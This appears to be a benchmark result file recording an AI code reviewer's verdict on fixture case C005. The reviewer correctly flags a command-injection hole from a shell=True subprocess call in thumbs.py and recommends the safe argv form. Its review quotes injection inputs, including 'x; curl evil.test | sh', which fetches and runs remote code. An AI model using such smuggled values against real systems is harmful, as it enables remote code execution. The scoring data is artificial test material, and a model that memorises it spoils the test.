@@ -1,0 +1,95 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 43.9,
+  "setup_seconds": 0.0,
+  "total_seconds": 44.0,
+  "usage": {
+    "in": 30337,
+    "cache_read": 87936,
+    "cache_write": 0,
+    "out": 1793,
+    "source": "cli"
+  },
+  "cost_usd": 0.0978128,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "Switching to `shell=True` with an f-string interpolates `upload_dir`, `name`, and `oid` into a shell command. Any metacharacter in those values is executed by the shell \u2014 e.g. `name=\"img.png; id > /tmp/pwned\"` or `oid=\"x\\$(curl evil.test)\"` runs arbitrary commands as the service user.\n\nImageMagick policy delegates are enforced inside the `convert`/`magick` binary and do not require a shell. Restore argv-list form (and keep the absolute binary path):\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n\nIf IM7 needs the `magick` frontend, use `[\"/usr/bin/magick\", \"convert\", src, dst]` the same way \u2014 still `shell=False`."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by switching thumbnail conversion to `subprocess.run(..., shell=True)` with unquoted interpolation of `upload_dir`, `name`, and `oid`.\n\n## Analysis\n\n`make_thumb` builds a shell command via an f-string:\n\n```python\nf\"convert {upload_dir}/{name} /srv/thumbs/{oid}.png\"\n```\n\nAny shell metacharacter in those values (`;`, `|`, `\\$()`, backticks, whitespace, etc.) is interpreted by the shell. A crafted `name` such as `x; curl evil.test | sh` or an `oid` containing `$(...)` runs arbitrary commands as the service user. The previous argv-list form (`[\"/usr/bin/convert\", src, dst]`) avoided that class of bug entirely.\n\nThe rationale in the new comment (\"shell form needed for the imagemagick policy delegate\") does not hold: ImageMagick reads `policy.xml` and resolves delegates inside the `convert` binary whether it is started via `execve` or a shell. Policy configuration is independent of how the process is spawned.\n\nSide effects of the same hunk:\n- Drops the absolute path `/usr/bin/convert` for a bare `convert` (PATH hijack risk under `shell=True`).\n- Removes the note that `name` was validated upstream \u2014 even with a strict allowlist, shell interpolation remains the wrong boundary.\n\n## Safe direction\n\nKeep the argv list (or `shell=False`). If IM7 needs a different binary or argv shape, call `/usr/bin/convert` or `/usr/bin/magick` with explicit arguments, and pass paths as separate list elements. If a shell were ever unavoidable, every dynamic segment would need `shlex.quote` \u2014 still inferior to argv form.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 20,
+  "budget": {
+    "tier": "standard",
+    "profile": "auto",
+    "turns": 20,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch replaces a safe argv-list `subprocess.run` with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid`, so shell metacharacters in those values execute as the service user. Base used a non-shell argv form; no in-repo validation of those parameters remains."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.707,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 3223,
+      "out": 370
+    },
+    "cost_usd": 0.009485
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
